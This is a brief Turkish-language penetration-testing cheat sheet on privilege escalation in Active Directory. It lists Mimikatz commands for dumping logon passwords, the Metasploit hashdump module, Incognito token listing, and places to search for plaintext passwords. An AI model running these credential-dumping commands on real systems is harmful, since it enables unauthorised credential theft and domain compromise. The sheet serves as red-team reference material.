# Active Directory

# 1. Active Directory üzerinde Hak Yükseltme

* Parola Elde Etme (düz metin veya hash)
	- Mimikatz	
		- mimikatz # privilege::debug
		- mimikatz # sekurlsa::logonpasswords
	- run post/windows/gather/hashdump

* Yüksek Yetkilere Sahip Kullanıcı Hesabı Kullanımı
	- incognito.exe list_tokens -u

* Düz Metin Parola Kullanımı Kontrolleri
	- Dosya
	- Registry

* Kullanılabilecek Araçlar
	- Incognito
	- Mimikatz
	- Windows Credentials Editor (WCE)
	- Hashdump